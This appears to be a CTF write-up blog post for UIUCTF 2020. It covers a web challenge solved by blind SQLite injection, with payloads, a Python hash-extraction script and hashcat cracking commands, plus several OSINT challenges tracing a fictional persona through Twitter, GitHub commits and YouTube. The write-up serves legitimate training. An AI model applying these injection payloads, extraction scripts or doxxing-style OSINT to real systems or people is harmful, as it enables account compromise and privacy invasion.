---
layout: post
title: "UIUCTF 2020 Writeups"
categories: ctf
---

## Introduction {#intro}
{: style="text-align: center"}

| Challenge Name | Category | Solves | Points |
|:--------------:|:--------:|:------:|:------:|
|[login_page](#login_page) | Web | 20 | 200 |
|[Starter OSINT](#starter-osint) | OSINT | 95 | 20 |
|[Isabelle's Bad Opsec 1](#isabelles-bad-opsec-1) | OSINT | 87 | 40 |
|[Isabelle's Bad Opsec 2](#isabelles-bad-opsec-2) | OSINT | 81 | 40 |
|[Isabelle's Bad Opsec 3](#isabelles-bad-opsec-3) | OSINT | 28 | 80 |
|[Isabelle's Bad Opsec 4](#isabelles-bad-opsec-4) | OSINT | 21 | 100 |
|[Isabelle's Bad Opsec 5](#isabelles-bad-opsec-5) | OSINT | 32 | 100 |

Date : Thu, 16 July 2020, 23:00 PDT — Sat, 18 July 2020, 23:00 PDT 

Teams with Points : 387  

Notes : First blood on Starter OSINT, Isabelle's Bad Opsec 1, & Isabelle's Bad Opsec 2

----------------

## login_page {#login_page}
{: style="text-align: center"}
#### Category: Web | Solves: 20 | Points: 200
{: style="text-align: center"}

----------------

{:refdef: style="text-align: center;"}
![login_page challenge description](https://i.imgur.com/mCYRHDL.png){: .imgCenter}
{: refdef}

The site is rather simple, with only a small login box and a user lookup feature.  Since we're told the site is running SQLite, it's a safe we're looking for something revolving around an injection. We try searching for just the SQLite wildcard "%" (which matches any string of 0 or more characters) and we're presented with a nice list of all the users in the database. 

{:refdef: style="text-align: center;"}
![user list found using sqlite wildcard](https://i.imgur.com/p5ULjCj.png){: .imgCenter}
{: refdef}

From here, we try to log in as Alice and are told we have the wrong password, but also given a password hint. 

{:refdef: style="text-align: center;"}
![login hint for alice](https://i.imgur.com/24imHr2.png){: .imgCenter}
{: refdef}

After playing around with injections for a little while, we find a nested SELECT query which proves to be extremely useful. By querying the `sqlite_master` table we can ask for data from any column in the database, but we can't actually SEE it. When we combine the nested SELECT query with a conditional AND statement, we can start to piece together the contents of those columns.

Through trial and error, we find that there are three basic ways in which the server can respond to our queries: with data, with no data, or with an error. Each of these happens in a different situation and gives us more insight into the structure of the database.

First, since we already know USERNAME exists, we use this as a baseline for a known-good query. We see that we get user data back when a specific column exists.

`%" AND username in (SELECT username FROM sqlite_master where username like "%") --`

{:refdef: style="text-align: center;"}
![results from good sql subquery](https://i.imgur.com/OAYJGKx.png){: .imgCenter}
{: refdef}

Next, we try to query columns for users we know don't exist.  This simply returns no information at all, without giving us any errors.

`%" AND username in (SELECT username FROM sqlite_master where username like "FAKE") --`

{:refdef: style="text-align: center;"}
![no results from sql subquery](https://i.imgur.com/22ycWWR.png){: .imgCenter}
{: refdef}

Lastly, we try a non-existent column to establish a baseline response for faulty queries.  When this is the case, we get the message `ERROR: Something went wrong!` We also get this error when we forget to comment out otherwise good, working queries by ending the query with the SQL single-line comment symbol `--`

`%" AND username in (SELECT username FROM sqlite_master where FAKE like "%") --`

{:refdef: style="text-align: center;"}
![error message on bad sql query](https://i.imgur.com/vq2OnGe.png){: .imgCenter}
{: refdef}

Using this knowledge we can guess at what the password column must be called, and after a couple tries we find that "password_hash" doesn't throw us any errors.  Now that we know what we're up against, we can switch up our query and use our old wildcard friend to brute-force the hash 1 character at a time by using a query like:

`%" AND username in (SELECT username FROM sqlite_master where password_hash like "%") --`

{:refdef: style="text-align: center;"}
![results from good sql subquery](https://i.imgur.com/mvZXAJu.png){: .imgCenter}
{: refdef}

Below is Python script that will be responsible for doing all of the heavy lifting. If what we know of the hash so far is correct for that user, the user's information is returned (e.g if Bob's hash starts with `41%`.) If any character of the hash so far is wrong (e.g if we ask if Bob's hash starts with `4F%`) the application won't return us any info at all. This allows us to check for the existence of the `bio` string for each user to make sure we're always on the right track.

{% highlight python %}
import requests
chars = '1234567890abcdef'                    
names = ['alice','bob','carl','dania','noob'] 

def hashfinder(x, name):                      
    url = 'https://login.chal.uiuc.tf/search'
    query = {'request' : name+'" AND username in (SELECT username FROM sqlite_master where password_hash like "'+x+'%") -- -'}
    req = requests.post(url, data=query)      
    if 'is '+name in req.text:                
        return(x)                             

for name in names:                            
    pwhash=''                                 
    while len(pwhash) < 32:                   
        for y in chars:                       
            if hashfinder(pwhash+y, name):    
                pwhash+=y                     
                if len(pwhash) == 32:         
                    print(name +':'+ pwhash)  
{% endhighlight %}

When run, this bad boy gives us the output of:

| name | hash |
|:----:|:----:|
| alice | 530bd2d24bff2d77276c4117dc1fc719 |
| bob | 4106716ae604fba94f1c05318f87e063 |
| carl | 661ded81b6b99758643f19517a468331 |
| dania | 58970d579d25f7288599fcd709b3ded3 |
| noob | 8553127fedf5daacc26f3b677b58a856 |

Now that we have extracted all the hashes, we can get to work trying to crack them using the hints we are given.  Luckily, there is only one hash without a corresponding hint (`8553127fedf5daacc26f3b677b58a856`) and with a simple Google search we find out that the password is `SoccerMom2007`. We use this password to sign in and are given the first part of our flag : `uiuctf{Dump`
Side note: the password/hash combo is on Google because it is in the very popular [RockYou wordlist](https://github.com/praetorian-code/Hob0Rules/blob/master/wordlists/rockyou.txt.gz) that is very commonly used in CTF-like challenges and is even included in Kali Linux (can be found in `/usr/share/wordlists/rockyou.txt.gz`)

{:refdef: style="text-align: center;"}
![looking up the first hash on google](https://i.imgur.com/Z9YPC5d.png){: .imgCenter}
{: refdef}

The second and third hashes are cracked very quickly with a very basic Hashcat command. It's worth noting that Hashcat has a built in mode for double MD5 (-m 2600), so Bob's password isn't really any harder to crack than Alice's as far as the commands go (although double MD5 is obviously slightly slower to crack.) If you want to learn more about the basics of cracking hashes with Hashcat, you can do so [here.](https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/) If you don't have a beefy GPU available, there's an [interesting blog post](https://deadpixelsec.com/Hashcat-on-Google-Colab) on how you can run Hashcat for free on Google Colab that you might find useful!

Hash number four requires us to build our own wordlist in the format of [Greek God name](https://gist.github.com/sshell/308f3518221d98c16a7b69eb9b209d85#file-gods-txt) + [U.S. State name](https://gist.github.com/sshell/308f3518221d98c16a7b69eb9b209d85#file-states-txt). This can be accomplished by finding these two separate lists on Google, and mixing with a [quick Python script](https://gist.github.com/sshell/308f3518221d98c16a7b69eb9b209d85#file-combine-py). I'm not going to include it here since it's mundane, but you can click the links if you want to see the lists and code behind this task. We found that the password ended up being `DionysusDelaware` and claimed the 4th piece of the flag.

The fifth and final hash is the most interesting one of the bunch.  The password hint is in Arabic and translates to `My favorite animal (6 characters only)` (this was later updated to specify _Arabic_ characters.) We ran it against a few animal wordlists to make sure it wasn't going to be THAT easy before deciding to crack the hash by guessing Arabic characters. This is tricky, but doable running Hashcat with the following arguments:

`hashcat -m 0 -a 3 --hex-charset -1 d8d9dadb -2 808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf -o output hashes "?1?2?1?2?1?2?1?2?1?2?1?2"`

On this [UTF-8 encoding table,](https://utf8-chartable.de/unicode-utf8-table.pl?start=1536) Arabic letters span 256 characters from `D880` to `DBBF`. We split up these two bytes and create a mask for each, meaning that each single Arabic letter is represented in the mask by a `?1?2` pair. Once we get the rule written, the hash is cracked rather quickly. With the final hash cracked, all we have to do is put together the five pieces of the flag and claim out 200 points!

{:refdef: style="text-align: center;"}
![arabic character on the unicode/utf-8 character table](https://i.imgur.com/49zr7TC.png){: .imgCenter}
{: refdef}

Here's what all the data looks like when we're all done:

| name | hint | hash | password | flag |
|------|------|------|----------|------|
| `noob` | `(none)` | `8553127fedf5daacc26f3b677b58a856` | `SoccerMom2007` | `uiuctf{Dump` |
| `alice` | `My phone number (format: 000-000-0000)` | `530bd2d24bff2d77276c4117dc1fc719` | `704-186-9744` | `_4nd_un` |
| `bob` | `My favorite 12 digit number (md5 hashed for extra security) [starts with a 10]` | `4106716ae604fba94f1c05318f87e063` | `5809be03c7cc31cdb12237d0bd718898` | `h45h_63` |
| `carl` | `My favorite Greek God + My least favorite US state (no spaces)` | `661ded81b6b99758643f19517a468331` | `DionysusDelaware` | `7_d4t_` |
| `dania` | `الحيوان المفضل لدي (6 أحرف عربية فقط)` | `58970d579d25f7288599fcd709b3ded3` | `طاووسة` | `c45h}` |

----------------

{:refdef: style="text-align: center;"}
[--- Back to Top ---](#intro)
{: refdef}

----------------

## Starter OSINT {#starter-osint}
{: style="text-align: center"}
#### Category: OSINT | Solves: 95 | Points: 20
{: style="text-align: center"}

----------------

```Our friend isabelle has recently gotten into cybersecurity, she made a point of it by rampantly tweeting about it. Maybe you can find some useful information ;).

While you may not need it, IsabelleBot has information that applies to this challenge.

Finishing the warmup OSINT chal will really help with all the other osint chals

The first two characters of the internal of this flag are 'g0', it may not be plaintext

Made By: Thomas (I like OSINT)```

We're looking for an account that has been active recently and is  named/has something to do with the character Isabelle. A quick Twitter  search for `"Isabelle"+"Security" `or `"Isabelle"+"Hack"` sorted by "Latest" will lead you to the user "epichackerisabelle" / [@hackerisabelle](https://twitter.com/hackerisabelle) after a small bit of scrolling. We make sure to click the "Tweets & Replies" button up top so that we see ALL of her tweets, and after a  bit of scrolling, we find the flag.

{:refdef: style="text-align: center;"}
![isabelle's past tweet](https://i.imgur.com/RuDRymr.png){: .imgCenter}
{: refdef}

----------------

{:refdef: style="text-align: center;"}
[--- Back to Top ---](#intro)
{: refdef}

----------------

## Isabelle's Bad Opsec 1 {#isabelles-bad-opsec-1}
{: style="text-align: center"}
#### Category: OSINT | Solves: 87 | Points: 40
{: style="text-align: center"}

----------------

```Isabelle has some really bad opsec! She left some code up on a repo that definitely shouldnt be public. Find the naughty code and claim your prize.

Finishing the warmup OSINT chal will really help with this chal

The first two characters of the internal of this flag are 'c0', it may not be plaintext Additionally, the flag format may not be standard capitalization. Please be aware

Made By: Thomas```

Finding a Github account is even easier because all we need to do is  search for "Isabelle," click on Users button, and then sort by "Most  Recently Joined." We see that she's one of the accounts created most  recently. One of the most popular places to hide secrets in Github is in past commits, so we go looking there and we an interesting base64  encoded value in [this commit.](https://github.com/IsabelleOnSecurity/mimidogz/commit/89f4f78390a1a31d08643ba16cba50dc9fcd5ecb) We decode the base64 and see that the flag is `uiuctf{c0mM1t_to_your_dr3@m5!}`

{:refdef: style="text-align: center;"}
![github user seach sorted by most recently created](https://i.imgur.com/D04KJqm.png){: .imgCenter}
{: refdef}

----------------

{:refdef: style="text-align: center;"}
[--- Back to Top ---](#intro)
{: refdef}

----------------

## Isabelle's Bad Opsec 2 {#isabelles-bad-opsec-2}
{: style="text-align: center"}
#### Category: OSINT | Solves: 81 | Points: 40
{: style="text-align: center"}

----------------

```Wow holy heck Isabelle's OPSEC is really bad. She was trying to make a custom youtube api but it didnt work. Can you find her channel??

Finishing Isabelle's Opsec 1 will may you with this challenge

The first two characters of the internal of this flag are 'l3', it may not be plaintext Additionally, the flag format may not be standard capitalization. Please be aware

Made By: Thomas```

The challenge text suggests that the next secret is in the other repository, so we go over there to sort through past commits once again.  We run across the channel id in [this commit](https://github.com/IsabelleOnSecurity/api-stuff/commit/115438b1b04324c931329e5a5296c54ed310db17) and now we get to switch focus to hunting around on YouTube. The flag ends up being in the URL of the "My website" link on the  EliteHackerIsabelle1337 YouTube page.

{:refdef: style="text-align: center;"}
![past github commit that shows isabelle's channel url](https://i.imgur.com/NZXlzdG.png){: .imgCenter}
{: refdef}

----------------

{:refdef: style="text-align: center;"}
[--- Back to Top ---](#intro)
{: refdef}

----------------

## Isabelle's Bad Opsec 3 {#isabelles-bad-opsec-3}
{: style="text-align: center"}
#### Category: OSINT | Solves: 28 | Points: 80
{: style="text-align: center"}

----------------

```

Isabelle has a youtube video somewhere, something is hidden in it.

Solving Previous OSINT Chals will help you with this challenge

The first two characters of the internal of this flag are 'w3', it may not be plaintext. Additionally, the flag format may not be standard capitalization. Please be aware

Made By: Thomas```

This challenge leaves you with very few clues other than it's "it's  in the video," which could mean just about anything. After doing some  analysis on the audio and video, and nothing immediately pops out. We  realize that for the low point total, we're probably overthinking it.  The challenge is only really solved by exhaustively clicking on all the  buttons. We find the flag by clicking the "Add Translation" button.

{:refdef: style="text-align: center;"}
![the page for adding translations on youtube](https://i.imgur.com/FDTPKNY.png){: .imgCenter}
{: refdef}

----------------

{:refdef: style="text-align: center;"}
[--- Back to Top ---](#intro)
{: refdef}

----------------

## Isabelle's Bad Opsec 4 {#isabelles-bad-opsec-4}
{: style="text-align: center"}
#### Category: OSINT | Solves: 21 | Points: 100
{: style="text-align: center"}

----------------

```Isabelle hid one more secret somewhere on her youtube channel! Can you find it!?

Finishing previous OSINT Chals will assist you with this challenge

The first two characters of the internal of this flag are 'th', it may not be plaintext

Additionally, the flag format may not be standard capitalization. Please be aware

Made By: Thomas [Authors Note] I love this chal because I used it IRL to find out who someone cyberbullying a friend was. It's real OSINT -Thomas```


This is more of the same, except now the flag is just hidden  somewhere "in the channel." Instead of sifting through browser traffic  to find all the assets unique to the channel, we use the top Google  result for ["YouTube OSINT Tool"](https://mattw.io/youtube-metadata/) and start sifting through the results we get back.  The flag turns out to be hidden in the profile's banner image, which is cropped differently for different platforms (desktop, mobile, smart TV, etc.) 

{:refdef: style="text-align: center;"}
![list of URLs to alternate banners](https://i.imgur.com/bv2sjWp.png){: .imgCenter}
{: refdef}

{:refdef: style="text-align: center;"}
![alternate banner that shows the flag](https://i.imgur.com/lIUs3ES.png){: .imgCenter}
{: refdef}

----------------

{:refdef: style="text-align: center;"}
[--- Back to Top ---](#intro)
{: refdef}

----------------

## Isabelle's Bad Opsec 5 {#isabelles-bad-opsec-5}
{: style="text-align: center"}
#### Category: OSINT | Solves: 32 | Points: 100
{: style="text-align: center"}

----------------

```Isabelle had one more secret on her youtube account, but it was embarrassing.

Finishing previous OSINT Chals will assist you with this challenge

The first two characters of the internal of this flag are 'hi', it may not be plaintext

The flag capitalization may be different, please be aware```

A challenge that mentions something that used to be on a website that isn't anymore... sounds like a job for the Wayback Machine. Sure enough, we try all of the pages and find that the URL for "My website" used to be a different flag.

----------------

{:refdef: style="text-align: center;"}
[--- Back to Top ---](#intro)
{: refdef}

----------------

greetz 2 @netspooky @xEHLE_ @Vechshshshs @banesec @d3npa21 @hermit and @dollarvpncIub
